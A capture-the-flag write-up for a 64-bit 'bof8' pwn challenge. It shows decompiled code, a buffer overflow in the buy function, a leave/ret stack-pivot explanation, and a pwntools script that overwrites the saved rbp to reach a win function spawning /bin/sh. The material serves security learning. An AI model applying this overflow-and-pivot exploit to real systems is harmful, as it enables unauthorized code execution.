## Challenge Overview
**Category**: Pwn

---

## Analysis
- Challenge provide ELF 64-bit file
![alt text](/images/pwned/bof8_file.png)

- I use `checksec` see that the binary has **No canary** and **No PIE**
![alt text](/images/pwned/bof8_checksec.png)

- `main` function 
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[2]; // [rsp+Eh] [rbp-2h] BYREF

  init(argc, argv, envp);
  var_global = (__int64)win;
  puts("Welcome human!");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("1. Buy");
        puts("2. Sell");
        puts("3. Exit");
        printf("> ");
        read(0, buf, 2u);
        if ( buf[0] != '1' )
          break;
        buy();
      }
      if ( buf[0] != '2' )
        break;
      sell();
    }
    if ( buf[0] == '3' )
      break;
    puts("Invalid choice!");
  }
  puts("Thanks for coming!");
  return 0;
}
```
- `win` function
```c
int win()
{
  return system("/bin/sh");
}

```
- In `buy` function, `buf` variable is declared as 24 bytes, but allows reading 40 bytes. Looking at the stack, I see that buffer overflow can be exploited to overwrite *rbp*.
```c
  puts("1. Apple");
  puts("2. Banana");
  puts("3. Cambridge IELTS Volumn 4");
  printf("> ");
  v2 = read(0, buf, 40u);                       // buffer overflow

-0000000000000020     _BYTE buf[28];
-0000000000000004     _DWORD var_4;
+0000000000000000     _QWORD __saved_registers;
+0000000000000008     _UNKNOWN *__return_address;
```

- In `sell` function, nothing noteworthy.
```c
int sell()
{
  return puts("I have nothing to sell");
}
```
- The value of the *rbp* register in the stack of the `buf` function is 0x7fffffffdd70
![alt text](/images/pwned/bof8_stack_buy.png)

- The value of the *rsp* register when calling the `ret` of the `main` function is 0x7fffffffdd78 
![alt text](/images/pwned/bof8_stack_main.png)
- The difference of over 8 bytes compared to the *rbp* registry above could be due to the `leave` instruction.
```nasm
.text:0000000000401364 leave
.text:0000000000401365 retn

leave:
mov rsp, rbp
pop rbp
```
- The address of `win` function is saved in the global variable `var_global`.
```c
var_global = (__int64)win;

.bss:0000000000404850 var_global      dq ? 
```

---

## Exploit code
```python
from pwn import *

p = process('./bof8')

var_global = 0x000000000404850 # save win address

# Exploit buffer overflow to modify rbp
p.sendafter(b'> ', b'1')
payload = b'a' * 32 + p64(var_global - 8)
p.sendafter(b'> ', payload)

p.interactive()
```